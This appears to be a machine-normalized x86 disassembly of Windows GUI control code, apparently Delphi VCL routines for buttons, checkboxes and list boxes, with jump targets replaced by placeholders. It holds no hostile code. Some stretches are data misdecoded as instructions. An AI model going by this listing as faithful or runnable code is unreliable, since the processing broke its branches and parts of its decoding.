call [ ecx + 0xc8 ]
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x215 ]
mov eax [ ebp - 0x4 ]
call sub_4369cc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20d ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_436efc
pop ecx
pop ebp
retn
push 0x0
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20d ]
push eax
push 0xcc
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call SendMessageA
sub_436efc
push ebx
mov ebx eax
cmp [ ebx + 0x20f ] 0x0
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_436f38
pop ebx
retn
sub_436f38
push ebx
push esi
push edi
add esp 0xffffff90
mov esi eax
push 0x0
call GetDC
mov ebx eax
push esp
push ebx
call GetTextMetricsA
mov eax [ esi + 0x68 ]
call sub_422f68
push eax
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x38 ]
push eax
push ebx
call GetTextMetricsA
push edi
push ebx
call SelectObject
push ebx
push 0x0
call ReleaseDC
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov ebx [ esp ]
mov eax [ esp + 0x38 ]
cmp ebx eax
jle r-xdata
cmp [ esi + 0x1a5 ] 0x0
je r-xdata
push 0x6
call GetSystemMetrics
shl eax 0x2
test ebx ebx
jns r-xdata
mov ebx eax
mov ebx 0x6
mov ebx 0x8
jmp r-xdata
sar ebx 0x2
add eax ebx
mov ebx eax
add ebx 0x3
mov edx [ esp + 0x38 ]
add edx ebx
mov eax esi
call sub_43fba4
add esp 0x70
pop edi
pop esi
pop ebx
retn
push 0x6
call GetSystemMetrics
imul ebx
mov ebx eax
jmp r-xdata
sub_437004
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0x7
jne r-xdata
mov edx ebx
mov eax esi
call sub_444724
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
jne r-xdata
xor eax eax
mov [ ebx + 0x4 ] eax
sub_43703c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
retn
push 0xfffffff0
mov eax esi
call sub_446be4
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
push 0x0
push 0x3
push 0xd3
mov eax esi
call sub_446be4
push eax
call SendMessageA
sub_43707c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4461c4
pop esi
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax ebx
call sub_436efc
mov eax ebx
call sub_44414c
sub_4370b0
push ebx
mov ebx eax
mov eax ebx
call sub_446108
test [ ebx + 0x51 ] 0x2
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_436f38
test [ ebx + 0x1c ] 0x1
jne r-xdata
sub_4370f8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_445f60
pop esi
pop ebx
retn
test [ ebx + 0x54 ] 0x1
jne r-xdata
push 0xfffffff0
mov eax ebx
call sub_446be4
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
mov eax ebx
call sub_436bbc
sub_437134
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_446ee8
test al al
je r-xdata
mov eax esi
mov si 0xffb3
call sub_403448
push 0xfffffff0
mov eax esi
call sub_446be4
push eax
call GetWindowLongA
test al 0x4
je r-xdata
pop esi
retn
sub_43716c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov edx esi
mov eax ebx
call sub_447ce4
pop esi
pop ebx
retn
sub_437188
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4428a4
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_4371ac
push ebx
mov ebx eax
mov eax ebx
call sub_44c9cc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033fc
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4371e2
mov eax eax
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push sub_43723a
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x0
retn
sub_437248
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4428d8
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_43729c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4476b4
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
sub_4372f0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_437314
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_4445c0
mov eax ebx
mov si 0xffb5
call sub_403448
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_446be4
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_403448
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_43738c
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_430fe0
mov ebx eax
mov eax ebx
call sub_4310c0
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_446be4
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_4311c0
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4373d8
push ebx
push esi
mov esi edx
mov ebx eax
call sub_430fe0
call sub_4310c0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_445000
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_437404
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443a38
cmp [ ebx + 0x209 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_43743c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_437248
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x4b
mov eax esi
call sub_43fb80
mov edx 0x19
mov eax esi
call sub_43fba4
mov dl 0x1
mov eax esi
call sub_446e18
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_4374c8
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov eax ebp
call sub_446ee8
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor esi esi
mov si 0x1
jmp r-xdata
push 0x1
push edi
push 0xf4
mov eax ebp
call sub_446be4
push eax
call SendMessageA
push 0xfffffff0
mov eax ebp
call sub_446be4
push eax
call GetWindowLongA
and eax 0xf
movzx edi si
cmp eax edi
je r-xdata
sub_43751c
push ebx
mov ebx eax
mov [ ebx + 0x210 ] dl
mov eax ebx
call sub_446ee8
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_457218
test eax eax
je r-xdata
mov edx [ eax + 0x220 ]
push edx
xor ecx ecx
mov edx 0xb007
call sub_441578
sub_437550
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_437404
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_443964
xor eax eax
mov al [ ebx + 0x210 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_4375b8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ edi + 0x4 ] 0xd
jne r-xdata
cmp [ edi + 0x4 ] 0x1b
jne r-xdata
cmp [ ebx + 0x212 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_446028
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
call sub_457120
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax ebx
mov si 0xffb8
call sub_403448
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403448
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_437625
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43769e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4403c4
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_4571a8
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_446030
mov eax ebx
mov si 0xffb8
call sub_403448
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403448
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4376a5
sub_4376ac
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ esi + 0x8 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
cmp ebx edi
sete al
mov [ ebx + 0x212 ] al
jmp r-xdata
mov dl [ ebx + 0x212 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov edx esi
mov eax ebx
call sub_446038
pop edi
pop esi
pop ebx
retn
sub_437700
push ebx
push esi
mov esi edx
mov ebx eax
call sub_430fe0
call sub_4310c0
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_43772c
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_430fe0
mov ebx eax
mov eax ebx
call sub_4310c0
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_446be4
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_4311c0
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_437778
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_437248
mov edx 0x61
mov eax esi
call sub_43fb80
mov edx 0x11
mov eax esi
call sub_43fba4
mov dl 0x1
mov eax esi
call sub_446e18
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_4377e4
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_403448
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_437810
mov dl [ eax + 0x212 ]
sub dl 0x1
jb r-xdata
cmp [ eax + 0x211 ] 0x0
je r-xdata
je r-xdata
mov dl 0x1
call sub_437898
retn
mov dl 0x2
call sub_437898
jmp r-xdata
xor edx edx
call sub_437898
retn
dec dl
je r-xdata
retn
mov dl 0x1
call sub_437898
jmp r-xdata
sub_437898
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x212 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x212 ] dl
mov eax ebx
call sub_446ee8
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_446be4
push eax
call SendMessageA
mov eax ebx
mov si 0xffeb
call sub_403448
sub_4378ec
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_437404
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_443964
mov eax ebx
mov si 0xffc8
call sub_403448
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x5
or eax edx
mov [ edi + 0x4 ] eax
and [ edi + 0x24 ] 0xfffffffc
pop edi
pop esi
pop ebx
retn
sub_437947
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x3ded173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_446be4
push eax
call SendMessageA
pop ebx
retn
sub_43798e
mov eax eax
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_437a1e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4403c4
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_4571a8
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_446030
mov eax ebx
mov si 0xffb8
call sub_403448
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov eax ebx
mov si 0xffb5
call sub_403448
test al al
je r-xdata
mov [ edi + 0xc ] 0x1
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437a25
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_437a3c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_437248
mov edx 0x71
mov eax esi
call sub_43fb80
mov edx 0x11
mov eax esi
call sub_43fba4
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_437aa4
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_403448
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_437ae4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_4438dc
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4438a0
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov edi ebx
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x95 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_44cc60
sub_437ba0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x211 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] bl
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_446e18
mov eax [ ebp - 0x4 ]
call sub_446ee8
test al al
je r-xdata
test bl bl
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
and eax 0x7f
push eax
push 0xf1
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call SendMessageA
push ebp
call sub_437ae4
pop ecx
mov eax [ ebp - 0x4 ]
call sub_43ffd0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_403448
sub_437c2c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_437404
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_443964
mov eax ebx
mov si 0xffc8
call sub_403448
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x4
or eax edx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_437c83
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x4129173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x211 ]
push eax
push 0xf1
mov eax ebx
call sub_446be4
push eax
call SendMessageA
pop ebx
retn
sub_437cb6
mov eax eax
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_437d2d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4403c4
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_4571a8
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_446030
mov eax ebx
mov si 0xffb8
call sub_403448
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437d34
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_437d3c
push esi
mov esi eax
mov ax [ edx + 0x6 ]
sub ax 0x1
jb r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
sub ax 0x4
je r-xdata
mov eax esi
mov si 0xffe9
call sub_403448
jmp r-xdata
pop esi
retn
sub_437d88
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_437e4c
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
push 0x0
push edi
push 0x18a
mov eax esi
call sub_446be4
push eax
call SendMessageA
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_439a3c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4045e8
test esi esi
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405eac
mov edx [ ebp - 0x8 ]
mov ecx edi
mov eax ebx
call sub_41ae04
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437e53
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_40445c
push eax
push edi
push 0x189
mov eax [ ebx + 0x10 ]
call sub_446be4
push eax
call SendMessageA
mov esi eax
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4045e8
sub_437e5a
mov eax eax
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_437edf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov al [ edi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffb1
call sub_403448
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_439a5c
mov esi eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437ee6
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405eac
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41ae04
sub_437ef0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp ] ecx
mov ebp edx
mov edi eax
mov eax [ edi + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ esp + 0x4 ] eax
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb3
call sub_403448
mov [ esp + 0x8 ] eax
xor ecx ecx
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb2
call sub_403448
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push 0x0
mov ecx [ esp + 0x4 ]
mov edx ebp
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x64 ]
mov ecx [ esp + 0x8 ]
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb2
call sub_403448
mov edx [ esp + 0x4 ]
mov eax [ edi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
sub_437f70
push esi
mov esi eax
cmp edx 0xffffffff
je r-xdata
pop esi
retn
mov eax [ esi + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
mov eax [ esi + 0x10 ]
mov si 0xffb0
call sub_403448
sub_437f98
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_438025
push [ fs : eax ]
mov [ fs : eax ] esp
or esi 0xffffffff
mov edi [ ebx + 0x10 ]
mov al [ edi + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43802c
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
mov eax [ ebp - 0x4 ]
call sub_40445c
push eax
push 0x0
push 0x180
mov eax edi
call sub_446be4
push eax
call SendMessageA
mov esi eax
test esi esi
jge r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
sub_438038
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4380c1
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4380c8
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
mov eax [ ebp - 0x4 ]
call sub_40445c
push eax
push edi
push 0x181
mov eax esi
call sub_446be4
push eax
call SendMessageA
test eax eax
jge r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
sub_4380e0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_438230
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438237
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fc0
retn
mov eax [ ebp - 0x4 ]
call sub_41ac88
xor eax eax
push ebp
push sub_43820e
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb3
call sub_403448
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx edi
mov si 0xffb3
call sub_403448
mov ecx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb2
call sub_403448
mov ecx [ ebp - 0xc ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
mov si 0xffb2
call sub_403448
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
cmp ebx eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
cmp edi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ad44
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_438250
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_446be4
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x10 ]
call sub_440900
sub_438284
